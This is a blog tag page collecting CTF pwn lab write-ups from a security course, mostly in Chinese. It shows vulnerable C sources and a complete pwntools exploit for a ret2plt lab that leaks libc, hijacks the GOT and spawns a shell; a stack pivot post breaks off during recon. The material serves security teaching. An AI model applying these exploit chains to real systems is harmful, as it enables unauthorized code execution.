<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/eductf/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Eductf"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>Eductf | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/eductf/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/eductf/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Eductf</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/>Simple PWN 0x33(2023 Lab - ROP_RW)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x332023-lab---rop_rw>Simple PWN 0x33(2023 Lab - ROP_RW)
<a class=anchor href=#simple-pwn-0x332023-lab---rop_rw>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>ROP chain</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> secret;
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> empty_buf[<span style=color:#ae81ff>0x30</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>check</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>input)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> pass[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> output[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>i)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)pass)[i] <span style=color:#f92672>=</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)input)[i] <span style=color:#f92672>^</span> secret;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (strcmp(pass, <span style=color:#e6db74>&#34;kyoumokawaii&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>i)
</span></span><span style=display:flex><span>			((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)output)[i] <span style=color:#f92672>=</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)flag)[i] <span style=color:#f92672>^</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)pass)[i];
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;flag = %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, output);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, _IONBF, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, _IONBF, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>	fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/home/chal/flag.txt&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>	read(fd, flag, <span style=color:#ae81ff>0x10</span>);
</span></span><span style=display:flex><span>	close(fd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/urandom&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>	read(fd, <span style=color:#f92672>&amp;</span>secret, <span style=color:#66d9ef>sizeof</span>(secret));
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>i)
</span></span><span style=display:flex><span>		((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)flag)[i] <span style=color:#f92672>=</span> ((<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)flag)[i] <span style=color:#f92672>^</span> secret;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;secret = %lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, secret);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
</span></span><span style=display:flex><span>	gets(buf);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/>Simple PWN 0x34 (2023 Lab - ret2plt)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x34-2023-lab---ret2plt>Simple PWN 0x34 (2023 Lab - ret2plt)
<a class=anchor href=#simple-pwn-0x34-2023-lab---ret2plt>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Got Hijack / BoF</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>20</span>];
</span></span><span style=display:flex><span>	setvbuf(stdout,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Try your best :&#34;</span>);
</span></span><span style=display:flex><span>	gets(buf);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;boom !&#34;</span>);	
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li>checksec + file<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec chal
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    No RELRO
</span></span><span style=display:flex><span>    Stack:    No canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ file chal
</span></span><span style=display:flex><span>chal: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>f7ed984819a3908eff455bfcf87716d0fb298fac, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div>首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去</li><li>還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:</li><li>首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==<pre tabindex=0><code>pop rdi ret
puts got address
puts plt
</code></pre>這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address)</li><li>有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># leak puts got address to calculate libc base address</span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span></code></pre></div></li><li>現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有<code>/bin/sh</code>或是<code>/sh</code>的string，不過我們可以直接用同樣的方法，把字串送進去<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># fetch user input -&gt; /bin/sh\x00</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>bss_addr
</span></span><span style=display:flex><span>gets_plt,
</span></span></code></pre></div>此時他就會像使用者要輸入，並把我們的輸入丟到bss address</li><li>另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># fetch user input -&gt; system address</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>puts_got
</span></span><span style=display:flex><span>gets_plt
</span></span></code></pre></div>此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address</li><li>所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># system(&#39;/bin/sh\x00&#39;)</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>bss_addr
</span></span><span style=display:flex><span>puts_plt
</span></span></code></pre></div></li></ol><h2 id=exploit---ret2pltleak-base-address--got-hijackcall-system>Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
<a class=anchor href=#exploit---ret2pltleak-base-address--got-hijackcall-system>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./chal&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># r = remote(&#39;10.113.184.121&#39;, 10053)</span>
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401263</span>
</span></span><span style=display:flex><span>puts_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x403368</span>
</span></span><span style=display:flex><span>puts_plt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401070</span>
</span></span><span style=display:flex><span>gets_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x403378</span>
</span></span><span style=display:flex><span>gets_plt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401090</span>
</span></span><span style=display:flex><span>bss_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x403f00</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># leak puts got address to calculate libc base address</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    puts_got,
</span></span><span style=display:flex><span>    puts_plt,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fetch user input -&gt; /bin/sh\x00</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr,
</span></span><span style=display:flex><span>    gets_plt,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fetch user input -&gt; system address</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    puts_got,
</span></span><span style=display:flex><span>    gets_plt,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># system(&#39;/bin/sh\x00&#39;)</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr,
</span></span><span style=display:flex><span>    puts_plt
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Try your best :&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x28</span> <span style=color:#f92672>+</span> payload)
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>recvline())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;puts address = </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;system address = </span><span style=color:#e6db74>{</span>hex(system_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(p64(libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/>Simple PWN 0x35(2023 Lab - Stack Pivot)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x352023-lab---stack-pivot>Simple PWN 0x35(2023 Lab - Stack Pivot)
<a class=anchor href=#simple-pwn-0x352023-lab---stack-pivot>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/rylybxgji>Simple PWN - 0x09(stack pivoting)</a>
<a href=https://hackmd.io/@SBK6401/H1NX6Bloj>Simple PWN - 0x10(seccomp/Lab - rop2win)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x80</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall</p><ol><li>checksec + file<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec chal
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    Canary found
